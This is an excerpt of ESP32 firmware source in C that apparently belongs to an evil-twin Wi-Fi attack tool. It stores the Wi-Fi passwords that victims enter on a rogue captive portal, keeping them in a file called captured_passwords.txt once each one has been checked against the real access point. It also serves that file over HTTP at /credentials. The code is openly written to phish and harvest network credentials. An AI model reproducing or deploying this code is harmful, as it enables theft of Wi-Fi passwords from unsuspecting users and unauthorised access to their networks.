...
/* ------------------------------------------------------------------ */
/* Credential log file on SPIFFS                                        */
/* Format per line: SSID : channel : mac : password                    */
/* ------------------------------------------------------------------ */
#define CRED_LOG_PATH "/spiffs/captured_passwords.txt"

static void eviltwin_save_credential(const wifi_ap_record_t *target, const char *password) {
    FILE *f = fopen(CRED_LOG_PATH, "a");
    if (!f) {
        /* Try to create the file if it doesn't exist yet */
        f = fopen(CRED_LOG_PATH, "w");
    }
    if (!f) {
        ESP_LOGE(TAG, "Cannot open credential log: %s", CRED_LOG_PATH);
        return;
    }
    char mac_str[18];
    ...
    fprintf(f, "%s : %d : %s : %s\n",
            ...
            password);
    fclose(f);
    ESP_LOGI(TAG, "Credential saved → %s", CRED_LOG_PATH);
}
    ...
    while (!password_verified) {
        ...
        if (password_captured && !password_verified) {
            ...
            if (result.status == WIFI_VERIFY_CORRECT) {
                ...
                /* ---- Save to SPIFFS log file ---- */
                eviltwin_save_credential(target, evil_twin_password);
...
/* Serve the captured_passwords.txt log file as plain text */
static esp_err_t credentials_handler(httpd_req_t *req) {
    FILE *f = fopen(CRED_LOG_PATH, "r");
    if (!f) {
        httpd_resp_set_type(req, "text/plain");
        httpd_resp_sendstr(req, "No credentials captured yet.\n");
        return ESP_OK;
    }

    httpd_resp_set_type(req, "text/plain");
    httpd_resp_set_hdr(req, "Content-Disposition", "inline; filename=\"captured_passwords.txt\"");
...
static void start_captive_portal(void) {
    ...
    httpd_uri_t creds_uri = {
        .uri = "/credentials",
        .method = HTTP_GET,
        .handler = credentials_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(evil_server, &creds_uri);
